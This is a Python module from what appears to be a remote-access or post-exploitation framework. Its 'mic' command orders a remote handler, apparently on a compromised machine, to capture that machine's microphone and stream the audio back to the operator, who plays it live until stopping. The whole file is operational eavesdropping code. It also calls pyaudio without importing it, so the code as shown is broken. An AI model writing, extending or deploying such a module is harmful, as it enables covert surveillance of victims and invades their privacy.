#!/usr/bin/env python3

from core.badges import badges
from core.transfer import transfer

class UnicornModule:
    def __init__(self, unicorn_handler):
        self.unicorn = unicorn_handler
        self.transfer = transfer(self.unicorn)
        self.badges = badges()

        self.name = "mic"
        self.description = "Listen microphone sound."
        self.usage = "Usage: mic"
        self.type = "managing"
        self.args = 1

    def run(self, cmd_data):
        p = pyaudio.PyAudio()
        CHUNK = 1024 * 4
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        stream = p.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        output=True,
                        frames_per_buffer=CHUNK)
        self.unicorn.send("mic".encode("UTF-8"))
        response = self.unicorn.recv()
        if response == b"success":
            print(self.badges.G + "Listening...")
            print(self.badges.I + "Press Ctrl-C to stop.")
            while True:
                self.unicorn.send("continue".encode("UTF-8"))
                try:
                    data = self.unicorn.recvall(4096)
                    stream.write(data)
                except (KeyboardInterrupt, EOFError):
                    self.unicorn.send("break".encode("UTF-8"))
                    stream.stop_stream()
                    stream.close()
                    p.terminate()
                    return
        else:
            stream.stop_stream()
            stream.close()
            p.terminate()
            print(self.badges.E + "Failed to listen!")
            return